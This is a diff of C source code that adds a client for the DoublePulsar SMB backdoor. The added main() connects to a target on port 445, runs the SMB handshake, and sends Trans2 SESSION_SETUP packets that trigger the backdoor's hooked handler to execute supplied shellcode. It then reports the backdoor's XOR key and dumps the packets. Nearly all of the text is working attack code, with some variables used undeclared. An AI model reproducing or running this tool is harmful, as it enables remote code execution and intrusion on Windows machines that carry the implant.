@@ -2,6 +2,25 @@
 #include <Windows.h>
 #include <stdio.h>
 
+//defines
+WORD get_pid(smb_info*);
+WORD get_uid(smb_info*);
+WORD get_mid(smb_info*);
+WORD get_tid(smb_info*);
+WORD get_fid(smb_info*);
+WORD get_special_mid(smb_info*);
+WORD get_special_pid(smb_info*);
+WORD get_datadisplacement(smb_info*);
+void set_pid(smb_info*, WORD);
+void set_uid(smb_info*, WORD);
+void set_mid(smb_info*, WORD);
+void set_tid(smb_info*, WORD);
+void set_fid(smb_info*, WORD);
+void set_special_mid(smb_info*, WORD);
+void set_special_pid(smb_info*, WORD);
+void set_datadisplacement(smb_info*, WORD);
+
+
 #pragma pack(push, 1)
 
 typedef struct _REQ_TRANSACTION_SECONDARY {
@@ -74,6 +93,79 @@ typedef struct _REQ_TRANSACTION2_SECONDARY {
 }REQ_TRANSACTION2_SECONDARY, * PREQ_TRANSACTION2_SECONDARY;
 
 #pragma pack(pop)
+
+#pragma pack(push, 1)
+
+typedef struct _SMB_HEADER {
+	BYTE Protocol[4];
+	BYTE Command;
+	union {
+		struct {
+			BYTE ErrorClass;
+			BYTE Reserved;
+			WORD Error;
+		}DosError;
+		DWORD NtStatus;
+	}Status;
+	BYTE Flags;
+	WORD Flags2;
+	union {
+		WORD Reserved[6];
+		struct {
+			WORD PidHigh;
+			union {
+				struct {
+					DWORD Key;
+					WORD Sid;
+					WORD SequenceNumber;
+					WORD Gid;
+				};
+				BYTE SecuritySignature[8];
+			};
+		};
+	};
+	WORD Tid;
+	WORD Pid;
+	WORD Uid;
+	WORD Mid;
+}SMB_HEADER, * PSMB_HEADER;
+
+#pragma pack(pop)
+
+
+struct smb_info {
+	WORD fid;
+	WORD tid;
+	WORD pid;
+	WORD uid;
+	WORD mid;
+	WORD special_mid;
+	WORD special_pid;
+	WORD DataDisplacement;
+	UNICODE_STRING tree_connection;
+	STRING tree_connect_andx_svc;
+	BYTE AndxCommand;
+	WORD AndxOffset;
+	PVOID sockaddrpointer;
+	PVOID socketpointer;
+	PVOID wsapointer;
+	DWORD_PTR connection_handle;
+	DWORD srv_last_error;
+	BYTE headerinfo[32];
+	BOOL DoublePulsarInstalled;
+	DWORD DoublePulsarXorKey;
+	WORD TransIndataShiftCount;
+	WORD TransFragTagOffset;
+	WORD TransConnectionOffset;
+	ULONG_PTR LastOOBReadAddress;
+	ULONG_PTR LastOOBWriteAddress;
+	STRING AttackingIPAddress;
+};
+
+typedef struct BUFFER {
+	DWORD dwsize;
+	PBYTE pbdata;
+}BUFWITHSIZE, * PBUFWITHSIZE;
 
 #define SMB_COM_NEGOTIATE				0x72
 #define SMB_COM_SESSION_SETUP_ANDX		0x73
@@ -179,6 +271,9 @@ typedef struct _REQ_TRANSACTION2_SECONDARY {
 #define MAKEPVOID(x)		\
 ((PVOID)(x))
 
+#define cpy(dst, src, size)		(memcpy(dst, src, (size_t)(size)))
+#define cmp(a, b, size)			(__memcmp(a, b, size))
+#define bzero(ptr, size)		(memset((ptr), 0x00, (size_t)(size)))
 
 DWORD __stdcall GetDoublePulsarStatusCode(BUFFER* IN bws, BUFFER IN* request)
 {
@@ -1240,9 +1335,355 @@ cleanup:
 
 int main()
 {
+	//Set up DoublePulsar packet
+	BUFFER tmp = { 0 }, shellcode = { 0 };
+	SOCKET s[2] = { 0 };
+	WSAData wsa = { 0 };
+	sockaddr_in sa[2] = { 0 };
+	unsigned status[0x10] = { 0 }, * connectstatus = (status + 1);
+	static smb_info info;
+	static RequestPacketLinkedList requests[0x20], * req;
+	static ResponsePacketLinkedList responses[0x20], * resp;
+	
+	
+	PTRANS_REQUEST_LIST transactionreqlist = NULL, transreqentry = NULL;
+	PTRANS_RESPONSE_LIST transactionresplist = NULL, transrespentry = NULL;
+	static DWORD smbrequestandresponsecount;
+	static BYTE newshellcodeipraw[sizeof(DWORD)];
+	
+	info.sockaddrpointer = sa;
+	info.socketpointer = s;
+	info.wsapointer = &wsa;
+	
+	info.connection_handle += (random() % 0x1000);
+
+	set_pid(&info, 65279);
+	set_mid(&info, 64);
+	set_tid(&info, 0);
+	set_uid(&info, 0);
+	
+	//copy our shellcode from read only memory
+	bwsalloc(&shellcode, SHELLCODE_SIZE);
+	cpy(shellcode.pbdata, SHELLCODE_DATA, shellcode.dwsize);
+	
+	do
+	{
+		if (!AllocateAndSetupTransactionRequestList(&transactionreqlist, GetUlong(&numberoftransentries)))
+		{
+			if (!GetLastError())
+				PutUlong(status, STATUS_NO_MEMORY), SetLastError(GetUlong(status));
+			else
+				PutUlong(status, GetLastError());
+			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
+			bwsfree(&shellcode);
+			bstatus = FALSE;
+			break;
+		}
+
+		transreqentry = transactionreqlist->Flink;
+
+		if (!AllocateAndSetupTransactionResponseList(&transactionresplist, GetUlong(&numberoftransentries)))
+		{
+			if (!GetLastError())
+				PutUlong(status, STATUS_NO_MEMORY), SetLastError(GetUlong(status));
+			else
+				PutUlong(status, GetLastError());
+			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
+			bwsfree(&shellcode);
+			FreeTransactionRequestList(&transactionreqlist);
+			bstatus = FALSE;
+			break;
+		}
+
+		transrespentry = transactionresplist->Flink;
+
+		PutUnsigned(connectstatus, TargetConnect(GetSocket(s), *sa, wsa, ip.Buffer, GetUnsigned(status)));
+
+		if ((GetUlong(connectstatus) != 0) || (GetUlong(status) != 0))
+		{
+			dbgprint("[%S]: %S could not connect to the target %ws:%u...\n", __FUNCTION__, "TargetConnect", wip.Buffer, 445U);
+			bstatus = FALSE;
+			break;
+		}
+
+		bstatus = SendRecvNegotiate(req, resp, GetSocket(s), &info);
+		++smbrequestandresponsecount;
+
+		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+
+		update_smb_info(&info, &req->ThisPacket);
+		update_smb_info(&info, &resp->ThisPacket);
+
+		if (info.srv_last_error & STATUS_FAIL)
+			break;
+
+		if (!bstatus)
+		{
+#ifdef _DEBUG
+			errmsg(__FUNCSIG__, __LINE__, WSAGetLastError() | info.srv_last_error);
+#endif
+			break;
+		}
+
+		req = req->NextEntry;
+		resp = resp->NextEntry;
+
+
+		bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s), &info);
+		++smbrequestandresponsecount;
+
+		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+
+		update_smb_info(&info, &req->ThisPacket);
+		update_smb_info(&info, &resp->ThisPacket);
+
+		if (info.srv_last_error & STATUS_FAIL)
+			break;
+
+		req = req->NextEntry;
+		resp = resp->NextEntry;
+
+		bstatus = SendRecvTreeConnectAndx(req, resp, GetSocket(s), &info, wip.Buffer);
+		++smbrequestandresponsecount;
+
+		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+
+		update_smb_info(&info, &req->ThisPacket);
+		update_smb_info(&info, &resp->ThisPacket);
+
+		if (info.srv_last_error & STATUS_FAIL)
+			break;
+
+		if (!bstatus)
+			break;
+
+		req = req->NextEntry;
+		resp = resp->NextEntry;
+
+		//send TRANSACTION2 SESSION_SETUP request to trigger double pulsars overwritten SESSION_SETUP handler function pointer
+		bstatus = SendRecvTrans2SessionSetup(req, resp, GetSocket(s), &info);
+		++smbrequestandresponsecount;
+
+		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+
+		FillInTransactionRequestListEntry(transreqentry, req);
+		FillInTransactionResponseListEntry(transrespentry, resp);
+
+		update_smb_info(&info, &req->ThisPacket);
+		update_smb_info(&info, &resp->ThisPacket);
+
+		if (GetUshort(&req->ThisSmb->Mid) != (GetUshort(&resp->ThisSmb->Mid) - DOPU_ERROR_SUCCESS))
+			break;
+
+		req = req->NextEntry;
+		resp = resp->NextEntry;
+
+		//revert multiplex ID to original value
+		set_mid(&info, GetUshort(&transreqentry->smb->Mid));	//set_mid(&info, GetUshort(&tmpmid) - DOPU_ERROR_SUCCESS);
+
+		//send exec shellcode SMB Trans2 SESSION_SETUP packet to double pulsar
+		bstatus = SendRecvTrans2SessionSetupExec(req, resp, GetSocket(s), &info, (&(resp - 1)->ThisPacket), &shellcode);
+		++smbrequestandresponsecount;
+		
+		if ((notnull(req->ThisPacket.pbdata) && isnull(req->ThisSmb)) && (notnull(resp->ThisPacket.pbdata) && isnull(resp->ThisSmb)))
+		{
+			req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+			resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+			req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+			resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+		}
+
+		FillInTransactionRequestListEntry(transreqentry, req);
+		FillInTransactionResponseListEntry(transrespentry, resp);
+
+		update_smb_info(&info, &req->ThisPacket);
+		update_smb_info(&info, &resp->ThisPacket);
+		
+		//set tmp mid to dopu status code from server's backdoor
+		PutUshort(&tmpmid, (GetUshort(&resp->ThisSmb->Mid) - GetUshort(&req->ThisSmb->Mid)));
+
+		if (!cmp(resp->ThisSmb->Protocol, "\xFFSMB", 4))
+		{
+			PutUlong(status, NT_STATUS_INVALID_SMB);
+			SetLastError(GetUlong(status));
+			errmsg(__FUNCSIG__, __LINE__, GetLastError());
+			break;
+		}
+
+		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != NT_STATUS_NOT_IMPLEMENTED)
+		{
+			PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
+			SetLastError(GetUlong(status));			
+			errmsg(__FUNCSIG__, __LINE__, GetLastError());
+			break;
+		}
+
+		if (GetUshort(&tmpmid) != DOPU_ERROR_SUCCESS)
+		{
+			PutUlong(status, (DWORD)(tmpmid));
+			SetLastError(GetUlong(status));
+			errmsg(__FUNCSIG__, __LINE__, GetLastError());
+			dbgprint("[%S] error code recieved from double pulsar backdoor: 0x%X\n", __FUNCSIG__, GetUnsigned(status));
+			break;
+		}
+
+		bstatus = SendRecvTreeDisconnect(req, resp, GetSocket(s), &info);
+		++smbrequestandresponsecount;
+
+		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+
+		update_smb_info(&info, &req->ThisPacket);
+		update_smb_info(&info, &resp->ThisPacket);
+
+		if (!bstatus)
+			break;
+
+		req = req->NextEntry;
+		resp = resp->NextEntry;
+
+		bstatus = SendRecvLogoffAndx(req, resp, GetSocket(s), &info);
+		++smbrequestandresponsecount;
+
+		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
+		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
+
+		update_smb_info(&info, &req->ThisPacket);
+		update_smb_info(&info, &resp->ThisPacket);
+
+		if (!bstatus)
+			break;
+	} while (FALSE);
+
+	PutUlong(status, ((bstatus == TRUE) ? 0 : info.srv_last_error));
+
+	for (i = 0; i < smbrequestandresponsecount; i++)
+	{
+		req = &requests[i];
+		resp = &responses[i];
+		wprintf(L"------------------REQUEST INFO-------------------\n\n");
+		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))));
+		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize)) + sizeof(DWORD)));
+		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(req->ThisSmb->Command));
+
+		switch (req->ThisSmb->Command)
+		{
+		case SMB_COM_NEGOTIATE:
+			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
+			break;
+
+		case SMB_COM_SESSION_SETUP_ANDX:
+			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
+			break;
+
+		case SMB_COM_TREE_CONNECT:
+			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
+			break;
+
+		case SMB_COM_NT_CREATE_ANDX:
+			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
+			break;
+
+		default:
+			break;
+		}
+
+		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Pid));
+		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Mid));
+		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Uid));
+		wprintf(L"SMB tree ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Tid));
+
+		DumpHex(req->ThisPacket.pbdata, req->ThisPacket.dwsize);
+		wprintf(L"\n\n");
+	}
+
+	for (i = 0; i < smbrequestandresponsecount; i++)
+	{
+		req = &requests[i];
+		resp = &responses[i];
+		wprintf(L"------------------RESPONSE INFO-------------------\n\n");
+		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))));
+		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize)) + sizeof(DWORD)));
+		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(resp->ThisSmb->Command));
+		wprintf(L"SMB NTSTATUS:\t0x%08X\n", GetUnsigned(&resp->ThisSmb->Status.NtStatus));
+
+		switch (resp->ThisSmb->Command)
+		{
+		case SMB_COM_NEGOTIATE:
+			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
+			break;
+
+		case SMB_COM_SESSION_SETUP_ANDX:
+			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
+			break;
+
+		case SMB_COM_TREE_CONNECT:
+			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
+			break;
+
+		case SMB_COM_NT_CREATE_ANDX:
+			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
+			break;
+
+		default:
+			break;
+		}
+		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Pid));
+		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Mid));
+		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Uid));
+		wprintf(L"SMB Tree ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Tid));
+		DumpHex(resp->ThisPacket.pbdata, resp->ThisPacket.dwsize);
+		wprintf(L"\n\n");
+	}
 
 
 
+	goto cleanup;
 
+cleanup:
 
+	if (info.DoublePulsarInstalled)
+		PutUlong(status, 0);
+	else
+		PutUlong(status, STATUS_FAIL);
+
+	resp = responses;
+	if (GetUlong(status) == 0)
+		_dbgprint("[+] double pulsar xor key:\t0x%08X\n", MAKEUNSIGNED(GetDoublePulsarXorKey(&responses[3].ThisPacket)));
+
+	//close socket and cleanup
+	if (validsock(GetSocket(s)))
+		closesocket(GetSocket(s));
+	WSACleanup();
+
+	//start at begining of lists
+	req = requests;
+	resp = responses;
+	//free buffers
+	FreeRequestLinkedListBuffers(req, &numberofreqentries);
+	FreeResponseLinkedListBuffers(resp, &numberofrespentries);
+	FreeUnicodeString(&wip);
+	FreeString(&ip);
+	FreeString(&info.AttackingIPAddress);
+	FreeString(&info.tree_connect_andx_svc);
+	FreeUnicodeString(&info.tree_connection);
+	if (notnull(shellcode.pbdata))
+		bwsfree(&shellcode);
+	return GetUlong(status);
 }
